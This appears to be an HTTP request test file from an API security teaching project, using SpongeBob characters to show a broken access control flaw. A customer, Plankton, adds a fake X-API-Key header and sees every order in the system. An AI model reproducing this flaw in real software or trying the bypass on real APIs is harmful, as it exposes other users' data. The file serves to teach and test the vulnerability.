# @import ../common/setup.http
@host = {{base_host}}/v204

# Sandy prepares to expand by enrolling new restaurants, although for now there's still
# just one restaurant, Krusty Krab in the system.

# Plankton exploits the new manager mode to see all orders in the system.

### --- Legitimate Usage: Mr. Krabs can see orders from all customers ---
GET /orders
X-API-Key: {{krabs_api_key}}

?? status == 200
?? js response.parsedBody.length > 1


### Regular customers like Plankton can only see their own orders
GET /orders
Authorization: {{plankton_auth}}

?? status == 200
?? js response.parsedBody.length == 1


### However, Plankton manages to exploit the system by adding a fake API key to his request
GET /orders
Authorization: {{plankton_auth}}
X-API-Key: fake

# Plankton sees all orders including SpongeBob's
?? status == 200
?? js response.parsedBody.length > 1
